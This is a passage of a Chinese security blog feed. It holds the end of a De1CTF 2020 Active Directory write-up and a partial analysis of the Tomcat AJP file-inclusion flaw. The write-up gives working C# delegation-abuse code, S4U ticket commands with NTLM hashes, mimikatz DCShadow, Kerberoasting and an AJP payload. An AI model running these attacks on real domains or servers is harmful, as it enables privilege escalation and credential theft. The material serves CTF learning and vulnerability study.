search.FindOne();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(ex.Message + <span class="string">"Exiting..."</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();</span><br><span class="line">                String sec_desc = <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;"</span> + sid.Value + <span class="string">")"</span>;</span><br><span class="line">                System.Security.AccessControl.RawSecurityDescriptor sd = <span class="keyword">new</span> RawSecurityDescriptor(sec_desc);</span><br><span class="line">                <span class="keyword">byte</span>[] riptor_buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[sd.BinaryLength];</span><br><span class="line">                sd.GetBinaryForm(riptor_buffer, <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中</span></span><br><span class="line">                entryToUpdate.Properties[<span class="string">"msds-allowedtoactonbehalfofotheridentity"</span>].Value = riptor_buffer;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    entryToUpdate.CommitChanges();<span class="comment">//提交更改</span></span><br><span class="line">                    Console.WriteLine(<span class="string">"[+] Exploit successfully!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(ex.Message);</span><br><span class="line">                    Console.WriteLine(<span class="string">"[!] \nFailed..."</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为环境很混乱几个队伍都在相互覆盖msds-allowedtoactonbehalfofotheridentity，所以先后添加了多个spn。。lisan3$ lisan4$<br><img src="1588576411595-d794a138-0eb8-4738-b4c5-ea04f61683b3.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=1112&size=65288&status=done&style=none&width=746" alt="image.png"><br>加上委派之后然后就是s4u提权了。这里踩了大坑，下面来说一下。我先用的kekeo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:lisan3$ &#x2F;domain:De1CTF2020.lab &#x2F;ntlm:30a7b270355d67451970d37ff1c9b666</span><br><span class="line">tgs::s4u &#x2F;tgt:TGT_lisan3$@DE1CTF2020.LAB_krbtgt~De1CTF2020.lab@DE1CTF2020.LAB.kirbi &#x2F;user:Administrator@De1CTF2020.lab &#x2F;service:cifs&#x2F;DM.De1CTF2020.lab</span><br></pre></td></tr></table></figure><p>S4U2self成功S4U2Proxy失败（<strong>当时反复确认过委派加上了的</strong>）<br><img src="1588578737623-9634b019-dbd5-4878-b9b2-c970e69673fb.png#align=left&display=inline&height=285&margin=%5Bobject%20Object%5D&name=image.png&originHeight=776&originWidth=2032&size=191776&status=done&style=none&width=746" alt="image.png"><br><img src="1588578449118-60bc0cf5-845d-4a75-9838-3537490e2e89.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=978&originWidth=3130&size=307346&status=done&style=none&width=746" alt="image.png"></p><p>换个工具rubues<br><img src="1588578877865-fa62ab88-598a-448a-9f29-a5e09ad0154b.png#align=left&display=inline&height=657&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1314&originWidth=1520&size=477950&status=done&style=none&width=760" alt="image.png"><br>但是dir始终不成功（后来问了一个师傅答复是：访问自己本身默认都是用当前用户身份去认证，不走网络认证，必须得主动调用网络认证才行）。<br><img src="1588578947263-dd9595db-1ef7-4933-956f-802b8d5973f2.png#align=left&display=inline&height=447&margin=%5Bobject%20Object%5D&name=image.png&originHeight=894&originWidth=2030&size=165161&status=done&style=none&width=1015" alt="image.png"><br>走到这里天色已晚有点肝不动了，就没继续了。第二天比赛结束出题师傅给我说用impakect就可以s4u而且能成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -spn cifs&#x2F;dm.De1CTF2020.lab De1CTF2020&#x2F;lisan4$</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-master&#x2F;examples&#x2F;lisan4$.ccache</span><br><span class="line">proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -k -impersonate Administrator -spn cifs&#x2F;dm.De1CTF2020.lab De1CTF2020&#x2F;lisan4$</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-master&#x2F;examples&#x2F;Administrator.ccache</span><br><span class="line">proxychains psexec.py -k -no-pass dm.De1CTF2020.lab</span><br></pre></td></tr></table></figure><p><strong>这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。</strong><br><strong>这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。</strong><br><strong>这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。</strong><br><strong><img src="1588579527302-5542f401-8459-4357-9d30-f4d0bbb75834.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=2110&size=852755&status=done&style=none&width=1055" alt="image.png"></strong><br>有system权限后就是Dcshadow的操作了</p><p>system权限下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell mimikatz.exe &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow &#x2F;object:de1ta &#x2F;attribute:primaryGroupID &#x2F;value:512&quot;</span><br></pre></td></tr></table></figure><p>我一直以为这种非交互式的mimkatz运行完会被beacon自动关闭掉，实际测下来并不会。<br><img src="1588580027676-64acd1f2-4138-4a48-8328-e8c898022ff7.png#align=left&display=inline&height=721&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1442&originWidth=2398&size=323731&status=done&style=none&width=1199" alt="image.png"><br>De1ta权限下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell mimikatz.exe &quot;lsadump::dcshadow &#x2F;push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="1588580226016-f9634854-eaa3-4542-b4aa-5b6a59536ee9.png#align=left&display=inline&height=702&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1404&originWidth=2018&size=262325&status=done&style=none&width=1009" alt="image.png"><br>执行完后system那边会有反应<br><img src="1588580304255-65913d34-697b-402d-ac44-1a37b924c90c.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=774&originWidth=1562&size=123041&status=done&style=none&width=781" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>会发现加上了<br><img src="1588580360804-da863178-d3eb-4ec1-aeb2-cc6c9c9042b9.png#align=left&display=inline&height=279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1432&size=73835&status=done&style=none&width=746" alt="image.png"><br>照理可以直接dir了但是最后还是有一个莫名其妙的坑（忽视图中把路径写错了，不过不影响这里的意思就是没权限，路径不存在是另外一个报错）<br><img src="1588580430211-30595b4a-cadb-4f8e-87b1-2a0d2913d5a9.png#align=left&display=inline&height=297&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=1720&size=125984&status=done&style=none&width=860" alt="image.png"><br>用rubues重新来一次tgt就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell Rubeus.exe asktgt &#x2F;user:de1ta &#x2F;rc4:B03094996601324646AC223BF30D0D07 &#x2F;domain:de1ctf2020.lab &#x2F;ptt</span><br><span class="line">shell type \\dc\c$\users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure><p><img src="1588580555529-42793246-2e0e-45ea-a113-9cebe5dc9d0f.png#align=left&display=inline&height=117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=214&originWidth=1364&size=44777&status=done&style=none&width=746" alt="image.png"></p><h2 id="来说说预期解拿到De1ta账号密码"><a href="#来说说预期解拿到De1ta账号密码" class="headerlink" title="来说说预期解拿到De1ta账号密码"></a>来说说预期解拿到De1ta账号密码</h2><p><img src="1588585694577-60526aee-a9a7-4263-ba3d-8085030371f6.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=1810&size=134342&status=done&style=none&width=905" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell setspn -s http&#x2F;DM.De1CTF2020.lab De1CTF2020\De1ta</span><br></pre></td></tr></table></figure><p><img src="1588585758205-e69fc027-0b02-4e6f-b516-8785fa075439.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&name=image.png&originHeight=344&originWidth=1426&size=63731&status=done&style=none&width=713" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure><p><img src="1588585820496-1b01ef87-4f61-424c-a363-3a1e47de1be5.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1226&size=83062&status=done&style=none&width=746" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;Empire&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1</span><br><span class="line">powershell Invoke-Kerberoast</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">TicketByteHexStream  : </span><br><span class="line">Hash                 : $krb5tgs$http&#x2F;DM.De1CTF2020.lab:0B5E0028717C31BF16F95DDF</span><br><span class="line">                       CA441A51$A71E43FD37E2E10E3029FE2767B0266CCABE13F68B27A46</span><br><span class="line">                       955A440DA3F3B4AF1D4C7A8C357B69655364C27DA73C80FBE9075A94</span><br><span class="line">                       615EB720E7A3E1E8610A1C18962338E87479D0A17D902B904B4DE4B5</span><br><span class="line">                       AD3BAE015D3709899570BD6D25392C9E98345535523CCBE65125B0E7</span><br><span class="line">                       1F2482040F2347DD13B7062B8A9E6DAA5C79F2843A2F030BBA0DCA91</span><br><span class="line">                       8FFEEE32D61BCAF4453315AAED98A427CF843C71EDB3EFBD2F47EF83</span><br><span class="line">                       9229E51A6A10A9D180B6EAF698B9C5D446F61BCA21E59413EC380A3F</span><br><span class="line">                       426F941EA42704B7262812E44FA1F04F05DAFF0E06B5690538D3BB8B</span><br><span class="line">                       10263FE97E05D6FE9F9E5BF1EFFF6A0344FA8F8B20CC0AA39BF95538</span><br><span class="line">                       4C3B543BF9B9A4E23C8F071D24E846F284A6FE62278E76ED47897FB2</span><br><span class="line">                       3264CC57A7EDE8C613EAD87914C511F2554AAEA6F663E66B8BA0760C</span><br><span class="line">                       296F82253303A5FF2DF5F8343AD2097F57B376BF83C302D806D620B9</span><br><span class="line">                       8ED2D3C53DF65AE37A7D6356EFC1A9123CCF56549A5288C132E3F5D0</span><br><span class="line">                       5A066CE50FFCB654BF79FD5F673175F9AD98C1140E8B50D0F574080A</span><br><span class="line">                       48EADBFBB00668B96A79F95E429CC42B4BD3CA2C9A106CD6D39312D9</span><br><span class="line">                       BD13B4452861E47DD71F36D3DAD4A570480D56BDEF1F278518219FA2</span><br><span class="line">                       5D076758B994C5F4EC8CF49C85DA1CFFAC91DF63AB5D71EF5135CD36</span><br><span class="line">                       D54FCB9C2A9EF61D67A3BC01EF668F255A66487F3493BE0F8352EAFF</span><br><span class="line">                       A009D561BE459F1130C6A3AF81060FD82232B3E430A196C5580FBDBB</span><br><span class="line">                       3EEAC6AA6FD2774063CB16C1CB161B20CD6ED3BF414349DECCCF8753</span><br><span class="line">                       9CE1EEBC28DD27DCE32752640F22817286211841DE22191300D75970</span><br><span class="line">                       D721021FA1211FA368A14EACEBABA5B42B1F3B087CE04782A695F046</span><br><span class="line">                       1CCCDC1445DE56D31582825E2824E47499C91A396D867A4284C4DD40</span><br><span class="line">                       AD1E1AF7A2073729FCB66A52C076A7F3515C93F54189CBDAAF408838</span><br><span class="line">                       736CA682CFF82CBA4DBFF757CD297CC16FF0A8F6F7C9F206ACB5BB87</span><br><span class="line">                       61C54AD1635572C16E6FC01B40E6F84F71153514EA21A87B28358A38</span><br><span class="line">                       4B3ECA5206F35EE3732DADE97726E07E8FEBE3D7EE3A77A2A4EEE1BE</span><br><span class="line">                       59F4EC5336E4F65D2A4F111C79A73D24F9BDFCCBEAEAC5768538EFAD</span><br><span class="line">                       00A191BB7941DF4A441BB83D061D42CB59D03A61921117DB835AA1D0</span><br><span class="line">                       DEB00AD6BC4A694CC39A465CF23447D7CDB1F19EBFCB92C555E75CE6</span><br><span class="line">                       7999B76A4FE22D1D34AF706A1505DC027D8BDC8A0055095605255BB8</span><br><span class="line">                       F437551248B77A559463C39934A6A95F183DD1FF5C4152949C0B6F69</span><br><span class="line">                       6C4B6A649A4B207CE4202B8884F54C1BC9ECA86F966EF2B86F3A89D3</span><br><span class="line">                       1E07C880C5E5DBCD35338FB485A46E74779D45BF38E2398A16377C15</span><br><span class="line">                       43E32DACFF71713DBF7288640AA751FC5A51B8DF873BBEB1F946331C</span><br><span class="line">                       CF59E6FC4209322D9BCAB8C51F5B408545BA9C4DA11755B4477DF968</span><br><span class="line">                       90F72E86D900D78BE6006BD14E1380725D1D8</span><br><span class="line">SamAccountName       : De1ta</span><br><span class="line">DistinguishedName    : CN&#x3D;De1ta,CN&#x3D;Users,DC&#x3D;De1CTF2020,DC&#x3D;lab</span><br><span class="line">ServicePrincipalName : http&#x2F;DM.De1CTF2020.lab</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 kerberos.txt cracks.txt</span><br></pre></td></tr></table></figure><p>ps：用ps也可以GetSPNUser</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;wintool&#x2F;kerberoast&#x2F;GetUserSPNs.ps1</span><br><span class="line">powershell GetUserSPNs</span><br></pre></td></tr></table></figure><p><img src="1588586928131-13925d80-d0b6-473b-9610-c1a4dc4fa2e2.png#align=left&display=inline&height=607&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1214&originWidth=3316&size=393681&status=done&style=none&width=1658" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      把一些停留在理论认知上的高级攻击姿势全部操练了一遍，学到很多。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>tomcat ajp 漏洞分析</title>
    <link href="http://yoursite.com/2020/04/26/tomcat-ajp-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/04/26/tomcat-ajp-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-04-26T13:25:37.000Z</published>
    <updated>2020-07-11T08:20:03.227Z</updated>
    
    <content type="html"><![CDATA[<!-- 漏洞原理本身很简单，值得学习的是tomcat运行的宏观流程，值得思考的是长亭的师傅是怎么挖到的。 --><!-- more --><h2 id="什么是ajp"><a href="#什么是ajp" class="headerlink" title="什么是ajp"></a>什么是ajp</h2><p>简单理解成http的二进制优化版。<br><img src="1586848883054-0b35011f-8666-4ece-b2ab-91515b6858d2.png#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&name=image.png&originHeight=300&originWidth=699&size=65236&status=done&style=none&width=746" alt="image.png"></p><h2 id="tomcat结构"><a href="#tomcat结构" class="headerlink" title="tomcat结构"></a>tomcat结构</h2><p>在Container部分，一个Host代表一个虚拟主机，一个Context代码一套web程序，一个Wrapper代表一个serlvlet。一个tomcat可以有多个Host，一个Host可以有多个Context，一个Context往往有多个Wrapper。<br><img src="1586848550182-49e7237d-f5f0-41ec-8fd0-8d3d2812569e.png#align=left&display=inline&height=564&margin=%5Bobject%20Object%5D&name=image.png&originHeight=705&originWidth=933&size=197577&status=done&style=none&width=746" alt="image.png"></p><p>在Conector部分Endpoint的Acceptor监听连接，Handler用于处理接收到的Socket，在内部调用Processor进行处理。processor把信息读取出来并设置进request中对象最后交给Adaptor，Adapter将请求适配到Servlet容器进行具体的处理。<br><img src="1586848576204-d9c37880-c814-47ec-be54-a306d6189fa5.png#align=left&display=inline&height=325&margin=%5Bobject%20Object%5D&name=image.png&originHeight=457&originWidth=1050&size=78935&status=done&style=none&width=746" alt="image.png"></p><h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>tomcat 7.0.96</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"> Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment">  contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment">  this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment">  The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment">  (the "License"); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment">  the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">                      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">"3.0"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">metadata-complete</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Welcome to Tomcat<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">     Welcome to Tomcat</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="代码流程跟踪"><a href="#代码流程跟踪" class="headerlink" title="代码流程跟踪"></a>代码流程跟踪</h2><p>代码跟踪从handler调用processor的process开始。<br><img src="1586853383398-98ae9333-1d19-4dc9-86fa-9b912bc79233.png#align=left&display=inline&height=473&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1758&originWidth=2770&size=598418&status=done&style=none&width=746" alt="image.png"><br>process里面有两部很重要一个是prepareRequest，另一个是this.adapter.service。<img src="1586863715345-6ad632aa-82f6-421e-a9f3-a2af6b8cb53c.png#align=left&display=inline&height=448&margin=%5Bobject%20Object%5D&name=image.png&originHeight=896&originWidth=2356&size=258201&status=done&style=none&width=1178" alt="image.png"></p><h3 id="prepareRequest"><a href="#prepareRequest" class="headerlink" title="prepareRequest"></a>prepareRequest</h3><p>先来看prepareRequest。顾名思义，这个函数的作用是把ajp的二进制版的http数据读取（请求方法，请求路径，http头等信息，不每处都截图了）并设置进request对象，然后设置一些对header和cookies长度或数量做一些限制。<br><img src="1586864450769-bb69818d-8d74-44e7-ae48-bf781e2d6104.png#align=left&display=inline&height=469&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1996&size=261734&status=done&style=none&width=998" alt="image.png"><br>接下来会读取一个叫attributeCode的东西，payload有意把它设置成了10。这样他会把我们在payload中构造的attributes设置进request对象的attribute，后面任意读文件或者包含祸起就是从这里开始的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">"/WEB-INF/web.xml"</span></span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, file_path,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="1586864883149-eb93af17-dd1e-4e89-9559-14f8929b7952.png#align=left&display=inline&height=345&margin=%5Bobject%20Object%5D&name=image.png&originHeight=690&originWidth=2204&size=205872&status=done&style=none&width=1102" alt="image.png"></p><h3 id="adapter-service"><a href="#adapter-service" class="headerlink" title="adapter.service"></a>adapter.service</h3><p>在adapter.service中会在postParseRequest中对url进行处理及合法性检查（这里面可能涉及到对url权限校验的问题以后有机会再聊）。如果合法的会进入下面的invoke。<br><img src="1586865838743-26dc4c06-7ea3-46d2-9cb9-2f36aedfafe5.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&name=image.png&originHeight=356&originWidth=2738&size=149846&status=done&style=none&width=1369" alt="image.png"></p><p>跟进invoke后会发现是一连串疯狂的invoke，这里取几个有代表性的截图<br>StandardEngineValve invoke<br><img src="1586923179322-45d6b282-158d-4eaf-9dfb-5004711c2893.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1124&originWidth=2454&size=310682&status=done&style=none&width=746" alt="image.png"><br>StandardHostValve invoke<br><img src="1586923274206-c60e2df8-166c-4b35-9f38-82b3551ec6fc.png#align=left&display=inline&height=798&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1596&originWidth=2724&size=515506&status=done&style=none&width=1362" alt="image.png"><br>StandardContextValve invoke<br><img src="1586923319531-6fa17c23-a6aa-41f8-a647-dd67f73ded50.png#align=left&display=inline&height=791&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1582&originWidth=2626&size=464917&status=done&style=none&width=1313" alt="image.png"><br>最后进入StandardWrapperValve的invoke<br>wrapper.allocate会返回这次请求对应的servlet，因为我们访问路径是/，所以默认对应index.jsp，所以由jspServlet来处理。<br><img src="1586923891934-b3956df4-f6f8-43eb-89a2-2efb12440777.png#align=left&display=inline&height=543&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1676&originWidth=2304&size=460267&status=done&style=none&width=746" alt="image.png"><br>接下来进入过滤器链<br><img src="1586931342555-5573ca98-21b6-41ea-abbb-9356e6503285.png#align=left&display=inline&height=323&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1078&originWidth=2486&size=327697&status=done&style=none&width=746" alt="image.png"><br>doFilter内部调用internalDoFilter<br><img src="1586950100578-c1b80b6c-7907-432f-92e4-94e9922ec789.png#align=left&display=inline&height=658&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1316&originWidth=2532&size=291640&status=done&style=none&width=1266" alt="image.png"><br>在internalDoFilter中会遍历所有注册过的filter然后进行过滤。遍历完成后会调用对应servlet的services方法。<br><img src="1586950744560-48b72337-e4aa-448a-ac97-4fed3e26894e.png#align=left&display=inline&height=221&margin=%5Bobject%20Object%5D&name=image.png&originHeight=442&originWidth=2248&size=110370&status=done&style=none&width=1124" alt="image.png"><br><img src="1586951186394-890844d7-b6a7-466b-804b-ea89313f8f6a.png#align=left&display=inline&height=665&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1330&originWidth=2734&size=376224&status=done&style=none&width=1367" alt="image.png"><br>这里会把payload中的 javax.servlet.include.request_uri javax.servlet.include.path_info提取并拼接到一起形成jspUri。<br><img src="1586960289652-da60cd10-c25c-4414-88e4-9368fc30f9fe.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=2702&size=334635&status=done&style=none&width=1351" alt="image.png"><br>这里jspUri会被传入，正常情况下这里传入的是jsp，tomcat会把jsp转为servlet，但是因为我们传入的路径是是非jsp文件不符合语法所以这部分原样输出。因此另一种使用方法也呼之欲出，如果有一个上传洞可以把文件上传到webapp目录下(不管什么后缀）那么我们可以包含这个文件达到rce效果（和php很像）。<br><img src="1586960624486-d7fff066-76db-4488-8574-0225b80ab005.png#align=left&display=inline&height=563&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1126&originWidth=1994&size=216493&status=done&style=none&width=997" alt="image.png"><br><img src="1586961002526-9f14dac1-fb1f-4c34-8d11-c81d79c5f330.png#align=left&display=inline&height=323&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=2736&size=192472&status=done&style=none&width=1368" alt="image.png"><br><img src="1586961828973-04fb72ff-63d4-4c35-802e-8f9fafd30083.png#align=left&display=inline&height=520&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1040&originWidth=2620&size=348008&status=done&style=none&width=1310" alt="image.png"></p><p>补充，只能包含webapp下面的东西。在读取之前会对传入的路径进行格式化，并在格式化后强制加/，无法../跳出。<br><img src="1586962499263-2e94b420-3934-43ba-9b82-2f845a5e7f6f.png#align=left&display=inline&height=383&margin=%5Bobject%20Object%5D&name=image.png&originHeight=766&originWidth=2320&size=231720&status=done&style=none&width=1160" alt="image.png"></p><h2 id="代码流程跟踪图"><a href="#代码流程跟踪图" class="headerlink" title="代码流程跟踪图"></a>代码流程跟踪图</h2><p><img src="1586849002838-3c230310-b346-46ad-b5e0-e636797563c6.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=942&size=83164&status=done&style=none&width=746" alt="image.png"></p><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" 